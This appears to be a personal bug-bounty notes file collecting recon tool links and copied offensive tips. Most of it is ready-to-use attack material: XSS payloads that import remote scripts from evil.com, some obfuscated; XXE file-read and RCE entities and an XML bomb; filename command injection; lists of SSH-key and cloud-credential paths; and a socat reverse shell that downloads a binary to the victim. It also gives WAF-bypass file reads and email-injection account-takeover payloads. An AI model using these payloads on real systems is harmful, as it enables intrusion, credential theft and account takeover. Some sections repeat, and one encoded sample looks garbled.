- Even if there is no active BBP or VDP program for any open-source project, you can still report it and apply for a CVE through MITRE. However, it's pointless to focus if the repo hasn't been updated in the past 4/5 years and has fewer stars and forks.

![None](https://miro.medium.com/v2/resize:fit:700/1*3MIY6WgU1ABBQdvKtnT_3A.png)

<<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>>

### urlhunter: A recon tool that allows searching on URLs that are exposed via shortener services

Link: https://https://t.co/lYKsb8enpvgithub.com/utkusen/urlhun 

**LazyHunter is an automated reconnaissance tool** designed for bug hunters, leveraging Shodan's InternetDB and CVEDB APIs. It retrieves open ports, hostnames, tags, and vulnerabilities for a given IP and fetches CVE details, including affected products and CVSS scores. Results are color-coded by severity for easy analysis.

https://github.com/iamunixtz/Lazy-Hunter

![[Pasted image 20250226082450.png]]


SpoofProof helps security professionals detect email domain spoofing vulnerabilities and validate DMARC, SPF, and DKIM configurations, making email security assessments seamless and efficient.

⭐Extension Name: SpoofProof - Domain Spoofing Validation 

🔗 BApp Store: [https://portswigger.net/bappstore/a321360c6e114b3dab6f2c67d68c241a](https://lnkd.in/gbk6ivQQ)
💻 Source Code: [https://github.com/portswigger/spoofproof](https://lnkd.in/grYdr2QG)

![[Pasted image 20250226082546.png]]

----

**Brut Security** Grab all the GF Patterns from different Repositories at one shot !! 🔥 **Link**:

> https://github.com/thecybertix/GF-Patterns


— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

![[Pasted image 20250627121926.png]]

🛰️ NEW TOOL: scando — Bash-based Subdomain Enumerator

⚡️ Fast recon with:
• subfinder
• assetfinder
• crt.sh
• AlienVault, URLScan, Web Archive, and more

🎯 Features:
• --help and --update flags
• Colorful ASCII banner
• Smart result merging
• Logging to script.log

📎 GitHub: https://github.com/escf1root/scando

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
# SubWatch – your next favorite tool for automated subdomain monitoring! 🔍

✅ Runs every 6 hours  
✅ Sends newly found subdomains directly to your Discord  
✅ Includes .txt file + message alerts  
✅ Perfect for bug bounty hunters & recon workflows  

📺 **Watch the YouTube video & get started now:**  
👉 https://youtu.be/BkpSQKSTFUI

📄 **Download & Readme on GitHub:**  
👉 https://github.com/Brut-Security/SubWatch

🔧 **Powered by:** subfinder, anew, jq, notify  
Built with 💙 by Brut Security

> https://youtu.be/BkpSQKSTFUI

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
### Metagoofil - Tool

#Exposed_PDFs

- **Purpose**: Extract metadata from public documents (PDFs, DOCXs).

**Command**:

```bash
metagoofil -d target.com -t pdf -n 50 -o docs
```

✅ Find usernames, file paths, software used by internal teams.

> https://github.com/opsdisk/metagoofil


A bot for building bug bounty reports:

> https://chatgpt.com/g/g-7BYOKw9eo-bounty-plz

Another Ai:

> https://chat.qwen.ai/

Copilot Chrome chat: https://copilot.microsoft.com/chats/kg5jwDP9zTvu95P1yZWLY


----


## Whatsapp Tips & Tools by Hack-R Academy:

> https://copilot.microsoft.com/chats/wrRh5jsqZSZ8dHD9svtSi

![[Pasted image 20250630193148.png]]

https://nas.io/brutsecurity/feed/aagc -# LFI to RCE vai phpinfo() –Turning file read into full remote code execution -> https://nas.io/brutsecurity/home

https://github.com/Brut-Security/BrutScope-Extractor


http://x.com/darkshadow2bd

1.

```
/*
---------------------------------------------------
💣 Simple RCE Test via File Upload
---------------------------------------------------

Test Concept:
Don't skip this basic method — it might lead to RCE if the app is not properly sanitizing inputs.

Scenario:
1. You find a file upload form that submits something like:
   fname="example.pdf"

2. Modify the filename parameter to include command injection, for example:
   fname="example.pdf\";id;#"

If the application doesn't sanitize the `fname` parameter properly and tries to execute it,
you may achieve Remote Code Execution (RCE)!

Tip:
- Always inspect how user inputs are handled in file uploads.
- Focus on parameters that might be interpreted or parsed as executable commands.
*/

```

2.

![[Pasted image 20250630200813.png]]

![[Pasted image 20250630211649.png]]

![[Pasted image 20250630200859.png]]

![[Pasted image 20250630211514.png]]

```
/*
⚡ Simple Temp Mail Bypass Method 🔥

Hello hunters! I'm DarkShadow, dropping a quick trick for when websites block temporary emails and only accept "legit" ones.

First, understand the security behind it:
When you sign up, the server doesn’t just trust your email. It checks if the domain is live via DNS before accepting and sending emails. Temp mail services use dead domains, so they fail this check.

Bypass Trick:
Use Burp Collaborator to create a "live" email!

Example:

Burp link:
https://2twpagov8v5bsbmdwktmtkyygpmia9yy.oastify.com

Make it look like an email:
admin123@2twpagov8v5bsbmdwktmtkyygpmia9yy.oastify.com

Since the domain is live (thanks to Burp), you’ll bypass the email validation easily!

Pro Tip:
Use Burp Collaborator emails — they’re not just for bypassing, they also help you spot SSRF vulnerabilities!
*/

```

Tired of junk Headers or having to scrool through bugs?


> https://github.com/rikeshbaniya/bodyonly


3.


```
/*
⚔️ Sneaky XSS Payloads & Blind Payloads via import()

Problem:
Tired of firewalls blocking alert(), prompt(), or confirm()? Try using JavaScript import() for bypass.

Sneaky XSS Payloads:
---------------------
import('data:text/javascript;base64,YWxIcnQoJ1hTUyEnKQ==')
// Decodes to: alert('XSS!')

import('data:text/javascript,%61lert(document.cookie)')
// '%61' is 'a' → alert(document.cookie)

Blind Payloads:
---------------------
<script type="module">import('https://evil.com/payload.js');</script>

<img src=x onerror="import('https://evil.com/payload.js')">

<svg onload="import('https://evil.com/payload.js')">

(() => {import('https://evil.com/payload.js')})()

import(/*trick*/'https://evil.com/payload.js')
*/


🔐 Encoded Variants for XSS or Remote Script Import

1. Unicode Escape Encoding:
----------------------------
\u0069\u006d\u0070\u006f\u0072\u0074('https://evil.com/payload.js')
// Decodes to: import('https://evil.com/payload.js')

2. ASCII Decimal Encoding via String.fromCharCode:
---------------------------------------------------
<script>
import(String.fromCharCode(
  104,116,112,115,58,47,47,101,118,105,108,46,
  99,111,109,47,112,97,121,46,106,115
));
// Result: import('https://evil.com/pay.js')
</script>

3. Payload Example (external JavaScript):
------------------------------------------
export function pwn() {
    alert('DarkShadow is here!');
}


```


CRTP notes: https://dev-angelist.gitbook.io/crtp-notes

```
/*
🧨 XXE (XML External Entity) Exploits — Test & RCE Variant

1. Basic XXE Payload to Check for Vulnerability:
--------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>&test;</root>

→ If response contains contents of /etc/passwd, the application is XXE vulnerable.

2. RCE Using PHP expect:// Wrapper (if supported):
----------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>

→ This executes the `id` command on the server and returns the result.

⚠️ Note: The `expect://` protocol works only if the PHP module is compiled with `expect` support — rare, but very dangerous when enabled.
*/

/*
🧾 XXE via php://filter and DoS via XML Bomb

3. Local File Read with php://filter
-------------------------------------
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>

→ Output: Base64-encoded content of /etc/passwd  
→ Useful for bypassing WAF filters and getting file contents safely.

4. Denial of Service (DoS) — XML Bomb
--------------------------------------
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>

→ Effect: Crashes the XML parser due to extreme entity expansion.
→ Often used for denial-of-service tests.
*/

# 🛡️ Useful Paths & Recon Tips for Sensitive Info Disclosure

# 5. Read User Private Keys (SSH)
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa
/etc/ssh/ssh_config
/var/backups/
/proc/self/environ    # Check for credentials or keys in memory

# 1. Steal AWS / Cloud Credentials via XXE
/home/www-data/.aws/credentials
/proc/self/environ    # Might reveal AWS keys, tokens

# 2. Dump Configs for DB Creds or Secrets
config.php
.env

# 3. Bash History Abuse
# ---------------------
# Also check:
.bash_history
# Sometimes contains:

# 4. Read Logs for Token Harvesting
# ---------------------------------
# Web Server Logs:
/var/log/apache2/access.log

# 5. Custom Internal Recon via /proc Files
# ----------------------------------------
# Also check:
/proc/self/cmdline
/proc/self/fd/
# Sometimes exposes secrets in memory or open database connections


```


![[Pasted image 20250630222346.png]]


```
# 🔥 Sensitive Information Leaks via Fofa Dorking

# Use the following Fofa search queries to discover Firebase configuration leaks:

# Option 1: Specific domain filter
body="firebaseapp" && domain="example.com"

# Option 2: Generalized host filter
(body="firebaseapp" || body="firebaseconfig") && host=".target_domain_name_only"

Read this to know how to exploit further: https://hackerone.com/reports/1447751

```

```
# 🎯 Session Cookie Manipulation via Base64

# Original session cookie observed:
Cookie: session=e3VzZXI6ZGFya3NoYWRvdxyyb2xlOnVzZXJ9Cg==

# Step 1: Decode the cookie value using Base64
echo "e3VzZXI6ZGFya3NoYWRvdxyyb2xlOnVzZXJ9Cg==" | base64 -d
# Output:
{user:darkshadow,role:user}

# Step 2: Modify the role from 'user' to 'admin'
echo "{user:darkshadow,role:admin}" | base64
# Encoded output:
e3VzZXI6ZGFya3NoYWRvdxyyb2xlOmFkbWluFQo=

# Step 3: Replace the session cookie with the modified one
Cookie: session=e3VzZXI6ZGFya3NoYWRvdxyyb2xlOmFkbWluFQo=

```

```
# 📡 Reverse Shell: Fully Interactive Using socat or Enhanced netcat

# Part-2: Stop using nc directly; improve it with rlwrap
# --------------------------------------------

# Option 1: rlwrap with cleanup, arrow keys work
rlwrap -cAr nc -lvnp <port>

# Option 2: fallback rlwrap command
rlwrap -f . -r nc -lvnp <port>

# These allow basic history navigation but not full interactive keyboard support

# For full TTY shell with interactive keyboard support (e.g., nano, Ctrl+C), use socat:

# On ATTACKER side:
socat file:tty,raw,echo=0 tcp-listen:<port>
# OR if error occurs:
socat file:$(tty),raw,echo=0 tcp-listen:<port>

# On VICTIM side:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<port>

# If socat is not available on victim:
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<port>

# To stop socat session:
ps aux | grep socat
kill -9 <PID>

```

```
# ⚡ Bypass Series for Bug Hunters 😎

# Part-1: Crazy WAF Bypass Examples

# Original command gets blocked by WAF:
cat /etc/hosts   # 🚫 Triggers WAF

# Alternatives that may bypass detection:
tac /etc/hosts     # 🤷 Reversed cat
man /etc/hosts     # 😎 Manual page read
nl /etc/hosts      # 🤯 Numbered lines
less /etc/hosts    # 🤔 View with pager
more /etc/hosts    # 🤯 Another pager option
strings /etc/hosts # 😁 Extract printable strings
tail /etc/hosts    # 😅 Last lines of file
head /etc/hosts    # 😢 First lines of file

```

```
# ⚡ Bash Series for Bug Hunters 😎 (Part-2)

# 📁 Create multiple directories using a one-liner:
mkdir {dev,test,prod}
# This creates three folders: dev, test, prod

# 📄 Create multiple files in one go:
touch {file1,file2,file3}.txt
# This results in: file1.txt, file2.txt, file3.txt

# 🔢 Generate files with numeric sequences:
seq -w 1 10 | xargs -I {} touch file{}.txt
# This produces: file01.txt, file02.txt, ..., file10.txt

```

```
# ⚡ Bypass Series for Bug Hunters 😎

# Part-2: More WAF Bypass Tricks for /etc/hosts

xxd -p /etc/hosts | xxd -p -r        # Hex encode and decode to view content
xargs -d '\n' -I{} echo {} < /etc/hosts  # Reads line by line using xargs
perl -pe '' /etc/hosts               # No-op perl read (may evade detection)
sed '' /etc/hosts                    # No-op sed call to output file
awk '{print}' /etc/hosts             # Simple awk print command
dd if=/etc/hosts 2>/dev/null         # Raw binary read, suppress errors

```

```
# ⚡ Crazy WAF Bypass Tricks (Part 3): /etc/hosts Access

# Original (blocked):
cat /etc/hosts   # 🚫 Likely triggers WAF

# Bypass Variants:
rev /etc/hosts | rev                     # 🔁 Reverse twice to reveal content
od -An -c /etc/hosts | tr -d ' '         # 📖 Read as chars, strip spaces
cat $HOME/../../etc/hosts                # 📂 Relative path trick
cat ${PWD}/../../../../etc/hosts         # 🧭 Dynamic path traversal
grep "" /etc/hosts                       # 🔎 grep to display everything
cut -c1- /etc/hosts                      # ✂️ Cut entire lines by char range
paste /etc/hosts                         # 📎 Outputs lines side by side

```

```
# 🐞 Business Logic Flow Bug — Username Reservation After Deletion

# Steps to identify the bug:

1. Register a new account and note the username used.
2. Verify and activate the account.
3. Delete that account.
4. Attempt to register again using the **same username**.

# Expected:
- You should be allowed to re-register with the same username.

# If Not:
- The system is incorrectly reserving deleted usernames.
- This indicates a **Business Logic Flow bug** (likely overlooked logic for cleanup).

# 💡 Why It Matters:
- Can lead to username squatting.
- Breaks user expectations or re-registration flows.
- Potential for privilege escalation if usernames are permanently tied to identity.

```

```
# 💥 Account Takeover Techniques via Email Parameter Manipulation

# Technique 1: HTTP Parameter Pollution (HPP)
email=victim@xyz.tld&email=hacker@xyz.tld

# Technique 2: Carbon Copy Injection (Header Injection)
email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld

# Technique 3: Using Separators to Append Addresses
email=victim@xyz.tld,hacker@xyz.tld
email=victim@xyz.tld%20hacker@xyz.tld
email=victim@xyz.tld|hacker@xyz.tld

# Technique 4: Omitting Domain
email=victim

# Technique 5: Omitting Top-Level Domain (TLD)
email=victim@xyz

# Technique 6: JSON Array Injection
{"email":["victim@xyz.tld","hacker@xyz.tld"]}

```

![[Pasted image 20250630232515.png]]

![[Pasted image 20250630232526.png]]

```
# 🔍 Fast Google Dorks for Recon & Info Disclosure

# 1️⃣ Exposed .env Files
intitle:"Index of" ".env"
"DB_PASSWORD" filetype:env
"APP_ENV=local" | "DB_HOST=127.0.0.1"

# 2️⃣ Exposed SQLite Databases
intitle:"Index of" ".sqlite"
intitle:"Index of" "db.sqlite"
filetype:sqlite | filetype:sqlite3 | filetype:db

# 3️⃣ Misconfigured Laravel or Public Directory Exposure
inurl:/public/.env
inurl:/public/db.sqlite
intitle:"Index of" inurl:/public/

# 4️⃣ Backup / Config Files (contain sensitive info)
intitle:"Index of" "backup"
intitle:"Index of" "config"
ext:sql | ext:bak | ext:old | ext:backup

# 5️⃣ Generic Index Dump
intitle:"Index of /" +passwd
intitle:"Index of /" +passwords

```

```
# 🏁 Race Condition Attack Points: Key Targets to Test

# 1️⃣ User Account Creation
# - Try creating multiple accounts with the same email simultaneously.
# - May bypass duplicate email checks or rate limits.

# 2️⃣ Account Deletion
# - Attempt to delete the same account concurrently.
# - Could result in deletion without proper authentication or double deletion bugs.

# 3️⃣ Email Verification Bypass
# - Race two requests to verify email with legit and spoofed addresses.
# - Potential to hijack account ownership.

# 4️⃣ Password Reset Flows
# - Trigger multiple password reset links and race them.
# - Attacker may capture or override the victim’s flow.

# 5️⃣ Privilege Escalation During Registration
# - Submit simultaneous signup requests with conflicting roles (user vs admin).
# - Could end up with unintended elevated privileges.

# 6️⃣ Coupon/Voucher Abuse
# - Redeem same code in rapid bursts to apply discount multiple times.

# 7️⃣ Payment Processing
# - Make multiple simultaneous purchases or withdrawals.
# - May cause negative balance or double refunds.

# 8️⃣ File Upload (RCE Edge Case)
# - Upload multiple files to the same endpoint at once.
# - May trigger unintended behavior like arbitrary code execution.

Voting or Rating System /   Subscription Plans
```


![[Pasted image 20250630234101.png]]

```
# 🎯 Escalating Self-XSS to Account Takeover via CSRF

# Key Insight:
# If you discover a Self-XSS vulnerability that occurs through a POST request — **don’t dismiss it**.

# Exploitation Strategy:
# 1. Craft a **CSRF proof-of-concept** using Burp Suite or a custom HTML form.
# 2. Deliver the malicious POST request to the victim.
# 3. Upon successful execution, the Self-XSS payload runs in the victim's session.

# 🔥 Result:
# ✅ The Self-XSS is now **exploitable by an external attacker**.
# 💥 This transforms it into a **one-click Account Takeover vulnerability**.

# Pro Tip:
# POST-based Self-XSS + CSRF = Dangerous combo that often gets overlooked during triage.

```


```
# 🔓 IDOR Bypass via Multi-ID Injection

# ⚔️ Scenario:
# Direct access to another user's resource is denied:
GET /api/users/5200/info
# ➜ Response: "Access Denied"

# 🕵️‍♂️ Bypass Trick:
# Inject your own user ID alongside the victim’s using a comma-separated format:
GET /api/users/5200,5233/info
# ➜ Response: "Bypass Successful" 🎯

# 💡 Insight:
# Some APIs parse multiple IDs and process the request if **any** belong to the authorized user.
# Always test:
- Comma-separated IDs
- Array-based ID parameters (e.g., ids=[5200,5233])
- Repeating the same parameter twice (e.g., id=5200&id=5233)

# Great for detecting weak access control logic.

```

```
# 🔑 Hardcoded Admin Credentials Found in JavaScript File

# 🧠 Key Takeaways:
# - Always gather all JavaScript files during reconnaissance.
# - Parse for sensitive URLs, even ones pointing to blank or unauthenticated pages.
# - JavaScript can reference other scripts or hidden endpoints.

# 🧪 Proof of Concept – Discovery Steps:

1. Visited a signup page on target application.
2. Used Burp Suite proxy to intercept all traffic and downloaded relevant `.js` files.
3. Noticed Base64-encoded strings in one JS file.
4. Decoded them and found embedded <script> tags referencing more URLs.
5. One of those URLs redirected to a blank page — but triggered additional JS calls.
6. One hidden endpoint (`admin-user-accounts.json`) revealed **hardcoded admin credentials**!
   - Accessible only through JS call chains.
   - Critical vulnerability hidden in plain sight.

# 🎯 Reminder:
Sensitive data like credentials should NEVER be stored or exposed in client-side files.

```

```
HOW TO

# 🎯 Escalating Self-XSS to Account Takeover via CSRF

# Key Insight:
# If you discover a Self-XSS vulnerability that occurs through a POST request — **don’t dismiss it**.

# Exploitation Strategy:
# 1. Craft a **CSRF proof-of-concept** using Burp Suite or a custom HTML form.
# 2. Deliver the malicious POST request to the victim.
# 3. Upon successful execution, the Self-XSS payload runs in the victim's session.

# 🔥 Result:
# ✅ The Self-XSS is now **exploitable by an external attacker**.
# 💥 This transforms it into a **one-click Account Takeover vulnerability**.

# Pro Tip:
# POST-based Self-XSS + CSRF = Dangerous combo that often gets overlooked during triage.

```

List of bug bountyes: https://bug-bounties.as93.net/